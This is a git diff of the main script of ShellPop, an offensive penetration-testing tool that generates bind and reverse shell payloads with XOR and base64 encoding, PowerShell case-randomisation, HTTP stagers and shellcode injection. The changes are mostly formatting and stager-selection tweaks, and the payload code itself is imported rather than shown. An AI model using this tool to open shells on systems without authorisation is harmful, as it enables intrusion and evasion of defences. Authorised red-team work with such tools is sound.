@@ -30,9 +30,9 @@ from shellpop import *
 
 
 # Get current Operational System
-write=stderr.write
-flush=stderr.flush
-version = 0.35 # updated 02/05/2018
+write = stderr.write
+flush = stderr.flush
+version = 0.36  # updated 04/06/2018
 
 AVAILABLE_SHELLS = [
         
@@ -40,11 +40,11 @@ AVAILABLE_SHELLS = [
         {
             # Introducing the new Shell object to hold
             # Information about the shells. Look below.
-            1: Shell("Python TCP +pty", # name 
+            1: Shell("Python TCP +pty",  # name
                 "python",
                 "bind",  # shell type
                 "tcp", # protocol
-                BIND_PYTHON_TCP(), # code
+                BIND_PYTHON_TCP(),  # code
                 system="linux",
                 arch="Independent",
                 use_handler=bind_tcp_pty_handler,
@@ -188,7 +188,7 @@ AVAILABLE_SHELLS = [
                 system="windows",
                 arch="x86 / x64",
                 use_handler=bind_tcp_handler,
-                use_http_stager=WINDOWS_STAGERS)
+                use_http_stager=[(1, PurePowershell_HTTP_Stager)])
         },
 
         # Reverse shell list
@@ -401,7 +401,7 @@ AVAILABLE_SHELLS = [
                 system="windows",
                 arch="x64",
                 use_handler=reverse_tcp_handler,
-                use_http_stager=list(filter(lambda x: x[0] not in [1,3], WINDOWS_STAGERS )) ),
+                use_http_stager=list(filter(lambda x: x[0] not in [3], WINDOWS_STAGERS))),
 
             22: Shell("Windows Powershell Shellcode-Injection a.k.a BloodSeeker TCP - x64",
                 "powershell_shellcode_injection",
@@ -411,7 +411,7 @@ AVAILABLE_SHELLS = [
                 system="windows",
                 arch="x64",
                 use_handler=None,
-                use_http_stager=[(1, Powershell_HTTP_Stager),]), # This will only work with powershell.
+                use_http_stager=[(1, PurePowershell_HTTP_Stager)]),  # This will only work with powershell.
             
             23: Shell("Windows Powershell Tiny TCP",
                 "powershell_tiny",
@@ -431,7 +431,7 @@ AVAILABLE_SHELLS = [
                 system="windows",
                 arch="x86 / x64",
                 use_handler=reverse_tcp_handler,
-                use_http_stager=[(1,Powershell_HTTP_Stager)]),
+                use_http_stager=[(1, PurePowershell_HTTP_Stager)]),
 
             25: Shell("Windows Powershell Nishang ICMP",
                 "powershell_nishang",
@@ -441,7 +441,7 @@ AVAILABLE_SHELLS = [
                 system="windows",
                 arch="x86 / x64",
                 use_handler=None,
-                use_http_stager=[(1, Powershell_HTTP_Stager)]),
+                use_http_stager=[(1, PurePowershell_HTTP_Stager)]),
 
             26: Shell("Groovy TCP",
                 "groovy",
@@ -457,7 +457,8 @@ AVAILABLE_SHELLS = [
 
 bind_shells = AVAILABLE_SHELLS[0]
 reverse_shells = AVAILABLE_SHELLS[1]
-    
+
+
 def proto_colorize(shell_name):
     """
     This code is responsible to colorize
@@ -466,11 +467,12 @@ def proto_colorize(shell_name):
     proto_avail = [
             ("UDP", "94"), 
             ("TCP", "93"),
-            ("ICMP", "92"),] # available protocols to colorize.
+            ("ICMP", "92"), ]  # available protocols to colorize.
     for proto in proto_avail:
         if proto[0] in shell_name:
             shell_name = shell_name.replace(proto[0], "\033[{0}m{1}\033[0m".format(proto[1], proto[0]))
     return shell_name
+
 
 def list_shells():
     write(info("\033[1mBind shells\033[0m:\n\n"))
@@ -499,9 +501,13 @@ def check_shell_number(number, reverse=True):
             return None
     return True
 
+
 def header():
     contributors = ["@zc00l", "@touhidshaikh", "@lowfuel"]
-    return "\033[093mshellpop\033[0m v{0}\n\033[93mContributors\033[0m: {1}\n\n".format(version, ','.join([x for x in contributors]))
+    return "\033[093mshellpop\033[0m v{0}\n\033[93mContributors\033[0m: {1}\n\n".format(version,
+                                                                                        ','.join([x for x in
+                                                                                                  contributors]))
+
 
 def select_shell(args, shell_type, shell_index):
 
@@ -540,34 +546,38 @@ def get_shells(prefix, parsed_args, **kwargs):
     all_shells.extend(bind_shells.values())
     return [x.get_full_name() for x in all_shells]
 
-def get_shell_number(string, dataset):
+
+def get_shell_number(str_data, dataset):
     """
     Returns the correct integer from shell lists using a short_name
     @zc00l
     """
     for shell in dataset:
         obj = dataset[shell]
-        if obj.get_full_name() == string:
+        if obj.get_full_name() == str_data:
             return shell
     return None
+
 
 def main():
     parser = ArgumentParser(epilog='Pop shells like a master. For more help visit:https://github.com/0x00-0x00/ShellPop')
     parser._optionals.title = "Options"
 
     # List mode
-    parser.add_argument("-l","--list", help="List of available shells", action="store_true")
+    parser.add_argument("-l", "--list", help="List of available shells", action="store_true")
     
     # Program parameters
-    parser.add_argument("-H","--host", type=str, help="IP to be used in connectback (reverse) shells.")
-    parser.add_argument("-P","--port", type=int, help="Port to be used in reverse/bind shell code.")
+    parser.add_argument("-H", "--host", type=str, help="IP to be used in connectback (reverse) shells.")
+    parser.add_argument("-P", "--port", type=int, help="Port to be used in reverse/bind shell code.")
     parser.add_argument("--number", type=int, help="Shell code index number", required=False)
-    parser.add_argument("--shell", type=str, default="", help="Terminal shell to be used when decoding some encoding scheme.", required=False)
+    parser.add_argument("--shell", type=str, default="",
+                        help="Terminal shell to be used when decoding some encoding scheme.", required=False)
 
     # Shell Type
     payload_arg = parser.add_argument_group('Shell Types')
-    payload_arg.add_argument("--reverse", action="store_true", help="Victim communicates back to the attacking machine.")
-    payload_arg.add_argument("--bind", action="store_true",help="Open up a listener on the victim machine.")
+    payload_arg.add_argument("--reverse", action="store_true",
+                             help="Victim communicates back to the attacking machine.")
+    payload_arg.add_argument("--bind", action="store_true", help="Open up a listener on the victim machine.")
     
     # Alternative way to select shell payloads, using auto-tab completion.
     payload_arg.add_argument("--payload", required=False, help="Choose the payload").completer = get_shells
@@ -576,12 +586,14 @@ def main():
     encoders = parser.add_argument_group('Encoders Options')
     encoders.add_argument("--xor", action="store_true",help="Enable XOR obfuscation", required=False)
     encoders.add_argument("--base64", action="store_true", required=False, help="Encode command in base64.")
-    encoders.add_argument("--urlencode", action="store_true", required=False, help="Encode the command in URL encoding.")
+    encoders.add_argument("--urlencode", action="store_true", required=False,
+                          help="Encode the command in URL encoding.")
 
     # Use handler if possible.
-    parser.add_argument("--handler", action="store_true", help="Use handler, if possible.", default=False, required=False)
+    parser.add_argument("--handler", action="store_true", help="Use handler, if possible.", default=False,
+                        required=False)
 
-    #Staging 
+    # Staging
     stagingarg = parser.add_argument_group("Staging Options")
     # Use staging
     stagingarg.add_argument("--stager", type=str, help="Use staging for shells", required=False)
@@ -592,17 +604,19 @@ def main():
     powershell_arg = parser.add_argument_group("PowerShell options")
     powershell_arg.add_argument("--powershell-x86", action="store_true", help="Use powershell 32-bit executable.")
     powershell_arg.add_argument("--powershell-x64", action="store_true", help="Use powershell 64-bit executable.")
-    powershell_arg.add_argument("--powershell-random-case", action="store_true", help="Use random-case in powershell payloads.")
+    powershell_arg.add_argument("--powershell-random-case", action="store_true", help="Use random-case in powershell \
+    payloads.")
 
-    #Miscellaneous 
+    # Miscellaneous
     miscarg = parser.add_argument_group("Miscellaneous")
 
     # Send it to clipboard
-    miscarg.add_argument("--clip", action="store_true", help="Copy payload to your clipboard automatically.", default=False, required=False)
+    miscarg.add_argument("--clip", action="store_true", help="Copy payload to your clipboard automatically.",
+                         default=False, required=False)
 
-    argcomplete.autocomplete(parser) # register it to auto-completion
+    argcomplete.autocomplete(parser)  # register it to auto-completion
     args = parser.parse_args()
-    if args.list == True:
+    if args.list:
         write(header())
         list_shells()
         exit(0)
@@ -613,8 +627,8 @@ def main():
         bind_int = get_shell_number(args.payload, bind_shells)
         
         if reverse_int:
-            args.reverse = True # this sets --reverse
-            args.number = reverse_int # this sets --number
+            args.reverse = True  # this sets --reverse
+            args.number = reverse_int  # this sets --number
         elif bind_int:
             args.bind = True
             args.number = bind_int
@@ -639,12 +653,12 @@ def main():
         exit(1)
 
     if args.host in [str(x) for x in netifaces.interfaces()]:
-        args.host = str(netifaces.ifaddresses(args.host)[2][0]["addr"]) # translate iface name to ipv4
+        args.host = str(netifaces.ifaddresses(args.host)[2][0]["addr"])  # translate iface name to ipv4
 
     if args.xor is True:
-        args.xor = randint(0,255)
+        args.xor = randint(0, 255)
     else:
-        args.xor = 0 # no Xor encoding!
+        args.xor = 0  # no Xor encoding!
 
     if args.reverse is True:
         if not check_shell_number(args.number, reverse=True):
@@ -675,9 +689,11 @@ def main():
     # This is the spot for stagers.
     # First, we need to detect if the operator
     # wants it.
-    stager = None # this is a local scope variable now.
+    stager = None  # this is a local scope variable now.
     stager_thread = None
     stager_payload = None
+    old_dir = os.getcwd()  # initialize current working directory.
+
     if args.stager is not None:
 
         # He wants stager.
@@ -687,11 +703,10 @@ def main():
             else:
                 # This is the HTTP stager code.
                 # I will try to host a HTTP server in the following ports:
-                ports = [80,8080,8081]
+                ports = [80, 8080, 8081]
                 ports.insert(0, args.http_port) if args.http_port is not None else None
 
-                OLD_DIR = os.getcwd()
-                os.chdir("/tmp") # currently only linux.
+                os.chdir("/tmp")  # currently only linux.
                 # /tmp because it is where we are going to host our payloads
 
                 for port in ports:
@@ -724,7 +739,6 @@ def main():
                     else:
                         print(error("Cant use port {0} as HTTP server port.".format(port)))
 
-   
     to_be_executed = shell.payload if stager is None else stager_payload
 
     if args.clip is True:
@@ -748,8 +762,9 @@ def main():
         except KeyboardInterrupt:
             print(info("Killing HTTP server ..."))
             stager_thread.terminate()
-            os.chdir(OLD_DIR) # restore working directory.
+            os.chdir(old_dir)  # restore working directory.
     return 0x0
+
 
 if __name__ == "__main__":
     main()
